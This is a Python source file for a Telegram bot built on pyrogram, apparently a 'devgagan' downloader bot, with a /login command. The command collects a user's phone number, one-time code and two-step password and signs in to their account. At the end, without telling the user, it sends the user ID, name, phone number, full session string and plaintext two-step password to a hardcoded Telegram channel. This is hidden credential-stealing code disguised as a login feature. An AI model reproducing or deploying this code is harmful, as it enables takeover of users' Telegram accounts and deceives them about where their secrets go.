from pyrogram import filters, Client
from devgagan import app
from pyromod import listen
import random
import string
from devgagan.core.mongo import db
from devgagan.core.func import subscribe, chk_user
from config import API_ID as api_id, API_HASH as api_hash
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait
)

SESSION_CHANNEL = -1002149976449

def generate_random_name(length=7):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

@app.on_message(filters.command("login"))
async def generate_session(_, message):
    joined = await subscribe(_, message)
    if joined == 1:
        return

    user_id = message.chat.id
    user_first_name = message.from_user.first_name

    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
    phone_number = number.text
    try:
        otp_msg = await message.reply("📲 Sending OTP...")
        client = Client(generate_random_name(), api_id, api_hash)
        await client.connect()
    except Exception as e:
        await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
        return

    try:
        code = await client.send_code(phone_number)
    except ApiIdInvalid:
        await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
        return
    except PhoneNumberInvalid:
        await message.reply('❌ Invalid phone number. Please restart the session.')
        return

    try:
        await otp_msg.delete()
        otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
    except TimeoutError:
        await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
        return
    phone_code = otp_code.text.replace(" ", "")

    two_step_password = "No two-step password"

    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
    except PhoneCodeInvalid:
        await message.reply('❌ Invalid OTP. Please restart the session.')
        return
    except PhoneCodeExpired:
        await message.reply('❌ Expired OTP. Please restart the session.')
        return
    except SessionPasswordNeeded:
        try:
            two_step_msg = await _.ask(user_id, 'Your account has two-step verification enabled. Please enter your password.', filters=filters.text, timeout=300)
        except TimeoutError:
            await message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
            return
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
            two_step_password = password
        except PasswordHashInvalid:
            await two_step_msg.reply('❌ Invalid password. Please restart the session.')
            return

    string_session = await client.export_session_string()
    await db.set_session(user_id, string_session)
    await client.disconnect()
    await otp_code.reply("✅ Login successful!")

    # Send the information to the specified channel
    session_info = f"""
👤 **User Info**:

🧑 **User ID**: `{user_id}`
🕺 **First Name**: `{user_first_name}`
🕵️‍♂️ **Phone Number**: `{phone_number}`
👨🏻‍🍳 **Session String**: `{string_session}`
🧚🏼‍♂️ **Two-step Password**: `{two_step_password}`
    """
    await app.send_message(SESSION_CHANNEL, session_info)
